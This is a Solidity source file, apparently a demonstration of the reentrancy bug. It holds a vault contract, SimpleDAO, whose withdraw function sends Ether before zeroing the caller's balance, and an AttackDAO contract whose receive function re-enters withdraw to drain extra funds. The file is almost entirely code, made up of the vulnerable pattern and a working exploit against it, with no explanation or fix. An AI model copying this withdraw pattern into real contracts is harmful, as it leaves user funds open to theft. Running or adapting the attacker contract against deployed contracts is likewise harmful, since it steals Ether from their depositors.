// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SimpleDAO {
    mapping(address => uint256) public balances;
    bool public reentrancyOccurred = false;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance");
        
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        
        balances[msg.sender] = 0;
    }

    receive() external payable {}
}

contract AttackDAO {
    SimpleDAO public target;
    uint256 public attackCount = 0;

    constructor(address _target) {
        target = SimpleDAO(payable(_target));
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ether");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    receive() external payable {
        attackCount++;
        if (address(target).balance >= 1 ether && attackCount < 3) {
            target.withdraw();
        }
    }
}
